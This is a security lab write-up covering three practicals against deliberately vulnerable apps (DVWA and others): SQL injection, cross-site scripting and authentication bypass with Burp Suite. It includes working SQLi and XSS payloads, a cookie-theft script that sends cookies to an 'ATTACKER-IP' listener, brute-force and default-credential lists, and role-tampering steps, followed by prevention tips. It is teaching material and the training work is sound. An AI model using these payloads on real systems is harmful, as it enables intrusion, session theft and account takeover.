// Practical 01 — SQL Injection Attack
Objective: To demonstrate how SQL Injection vulnerabilities can be identified and exploited using Burp Suite against a vulnerable web application (DVWA), and understand how to prevent such attacks.
🔧 Burp Suite Community 🎯 DVWA (Low Security) 🐧 Kali Linux ⚠️ OWASP A03:2021
TOOLS USED
  • T1Burp Suite Community Edition — For intercepting HTTP requests and manipulating parameters.
  • T2DVWA (Damn Vulnerable Web Application) — The target application running on localhost.
  • T3Firefox Browser — Configured with Burp Suite proxy (127.0.0.1:8080).
  • T4SQLMap (optional) — For automated detection and exploitation.
STEP-BY-STEP PROCEDURE
  • 01Launch Burp Suite and set it to intercept mode. Configure Firefox proxy to 127.0.0.1:8080.
  • 02Navigate to DVWA at http://localhost/dvwa, login (admin/password), set security level to LOW.
  • 03Go to the SQL Injection module. Enter a test value 1 in the User ID field and click Submit.
  • 04In Burp Suite Proxy, intercept the request. Right-click → Send to Repeater.
  • 05In Repeater, locate the id=1 parameter. Test with a single quote: id=1'. If a SQL error appears → vulnerable!
  • 06Use a UNION-based payload to extract database information. Send the request and analyze the response.
  • 07Escalate to extract usernames and passwords from the database using crafted UNION payloads.
  • 08Document all findings: error messages, extracted data, and response differences.
EXAMPLE PAYLOADS
// DETECTION PAYLOAD — Test for SQL error
1'
1''
1' OR '1'='1
1' AND 1=1 --
1' AND 1=2 --
// UNION-BASED EXTRACTION — Find number of columns
1' ORDER BY 1 --
1' ORDER BY 2 --
1' ORDER BY 3 -- (error = 2 columns exist)
// UNION SELECT — Extract DB version and user
1' UNION SELECT null, version() --
1' UNION SELECT null, user() --
1' UNION SELECT null, database() --
// EXTRACT USERS TABLE
1' UNION SELECT user, password FROM users --
1' UNION SELECT first_name, last_name FROM users --
RESULT
✅ VULNERABILITY CONFIRMED:

The SQL Injection vulnerability was successfully exploited. The application failed to sanitize user input, allowing us to manipulate the SQL query and extract sensitive data from the backend MySQL database. Retrieved: database version (MySQL 5.x), current DB user (root@localhost), database name (dvwa), and the complete users table containing hashed passwords (MD5).
PREVENTION TIPS
  • Use Prepared Statements (Parameterized Queries) — Never concatenate user input directly into SQL queries.
  • Implement Input Validation & Sanitization — Whitelist expected characters and reject suspicious inputs.
  • Apply the Principle of Least Privilege — DB accounts should have minimal permissions (no DROP/ALTER).
  • Use a Web Application Firewall (WAF) — ModSecurity or Cloudflare WAF can block common SQLi patterns.
  • Enable Error Handling — Never display raw SQL errors to users; log them server-side only.
  • Use ORMs (Object-Relational Mappers) — Frameworks like Django ORM, Hibernate automatically parameterize queries.
// Practical 02 — Cross-Site Scripting (XSS)
Objective: To identify and exploit Reflected and Stored XSS vulnerabilities using Burp Suite, demonstrate cookie theft and script injection, and understand mitigation strategies.
🔧 Burp Suite Community 🎯 DVWA / bWAPP 🐧 Kali Linux ⚠️ OWASP A03:2021
TOOLS USED
  • T1Burp Suite — Intercept and modify HTTP requests, use Repeater for payload testing.
  • T2DVWA — XSS (Reflected) and XSS (Stored) modules.
  • T3Browser DevTools — Inspect DOM changes and cookie values.
  • T4Custom HTTP Listener (Python) — To capture stolen cookies.
STEP-BY-STEP PROCEDURE
  • 01Set up Burp Suite proxy. Navigate to DVWA XSS (Reflected) module.
  • 02Enter a benign string like Hello in the name field. Intercept the GET request in Burp.
  • 03In Repeater, replace the value with a basic XSS test: <script>alert(1)</script>. Send the request.
  • 04If an alert box appears when the response renders in browser → Reflected XSS confirmed!
  • 05Move to XSS (Stored) module. Inject a persistent payload into the message/comment field.
  • 06Craft a cookie-stealing payload pointing to your listener server. Submit the form.
  • 07When any user visits the page, their session cookie will be sent to your listener.
  • 08Use Burp's Intruder to fuzz for XSS in multiple parameters simultaneously.
EXAMPLE PAYLOADS
// BASIC DETECTION PAYLOADS
<script>alert('XSS')</script>
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
'"><script>alert(document.domain)</script>
// COOKIE THEFT PAYLOAD
<script>document.location='http://ATTACKER-IP:8000/?c='+document.cookie</script>
// FILTER BYPASS PAYLOADS
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert(1)>
<a href="javascript:alert(1)">click</a>
<details open ontoggle="alert(1)">
// DOM-BASED XSS TEST
#<img src=x onerror=alert(1)>
javascript:alert(document.cookie)
RESULT
✅ XSS VULNERABILITY CONFIRMED:

Reflected XSS: Successfully triggered alert popup. The user-supplied input was reflected in the HTML response without encoding, executing arbitrary JavaScript.

Stored XSS: Injected script persisted in the database. Every visitor to the page triggered the payload — successfully demonstrated session cookie theft by capturing cookies on the attacker's Python listener server.
PREVENTION TIPS
  • Always HTML-encode output — Encode characters like < > & " ' before rendering in HTML context.
  • Implement Content Security Policy (CSP) headers to restrict script execution sources.
  • Use HTTPOnly and Secure flags on session cookies to prevent JavaScript from accessing them.
  • Validate and sanitize all user inputs using allowlisting (not just blocklisting).
  • Use modern frameworks (React, Vue, Angular) that auto-escape output by default.
  • Implement X-XSS-Protection and X-Content-Type-Options headers.
// Practical 03 — Authentication Bypass
Objective: To test and bypass authentication mechanisms using Burp Suite through techniques such as SQL injection in login forms, brute force with Intruder, default credentials, and session token manipulation.
🔧 Burp Suite Intruder 🎯 DVWA / WebGoat 🐧 Kali Linux ⚠️ OWASP A07:2021
TOOLS USED
  • T1Burp Suite — Intruder for brute-force attacks and Repeater for manual bypass testing.
  • T2DVWA Brute Force Module — Target login form for testing.
  • T3SecLists Wordlists — Common username/password lists for Intruder payloads.
  • T4Burp Decoder / Inspector — For JWT token analysis and manipulation.
STEP-BY-STEP PROCEDURE
  • 01Open DVWA Brute Force module. Enter any username/password and intercept the GET request in Burp Proxy.
  • 02Right-click the intercepted request → Send to Intruder. Navigate to Intruder → Positions tab.
  • 03Set attack type to Cluster Bomb. Mark username and password parameters with § symbols.
  • 04In Payloads tab: Load username wordlist for Payload Set 1, password wordlist for Payload Set 2.
  • 05Start the attack. Sort results by Length column — a different length indicates a successful login.
  • 06Test SQL-based auth bypass: Enter ' OR '1'='1 as username with any password.
  • 07Test default credentials: Try admin/admin, admin/password, root/root etc. via Repeater.
  • 08Capture session cookie after login, manipulate predictable session token values, attempt session fixation.
EXAMPLE PAYLOADS
// SQL INJECTION IN LOGIN FORM (Username field)
' OR '1'='1
' OR '1'='1' --
admin' --
admin'/*
' OR 1=1 LIMIT 1 --
// BURP INTRUDER — Brute Force HTTP GET Request
GET /dvwa/vulnerabilities/brute/?username=§admin§&password=§password§&Login=Login HTTP/1.1
Host: localhost
Cookie: PHPSESSID=abcd1234; security=low
// DEFAULT CREDENTIAL LIST (common targets)
admin:admin
admin:password
admin:123456
root:root
admin:admin123
guest:guest
// SESSION MANIPULATION — Cookie tampering
Original: role=user → Tamper to: role=admin
Original: userid=1002 → Tamper to: userid=1001
JWT: Change "role":"user" → "role":"admin" (then re-sign or remove signature check)
RESULT
✅ AUTH BYPASS SUCCESSFUL:

Brute Force: Burp Intruder successfully cracked the login form in under 2 minutes using the rockyou wordlist. Admin credentials (admin/password) identified by anomalous response length.

SQLi Auth Bypass: Entering ' OR '1'='1 in the username field bypassed the authentication entirely, granting admin access without knowing the actual password.

Cookie Manipulation: Changing the role=user cookie value to role=admin escalated privileges without requiring re-authentication.
PREVENTION TIPS
  • Implement Account Lockout Policies — Lock accounts after 3–5 failed login attempts.
  • Use Multi-Factor Authentication (MFA) — Even if credentials are stolen, MFA blocks unauthorized access.
  • Enforce Strong Password Policies and store passwords using bcrypt/argon2 (never MD5/SHA1).
  • Use CAPTCHA on login forms to prevent automated brute-force attacks.
  • Use Parameterized Queries to prevent SQL injection in login forms.
  • Generate cryptographically random session tokens — Never use predictable or sequential IDs.
  • Validate session integrity server-side. Never trust client-supplied role/permission values.
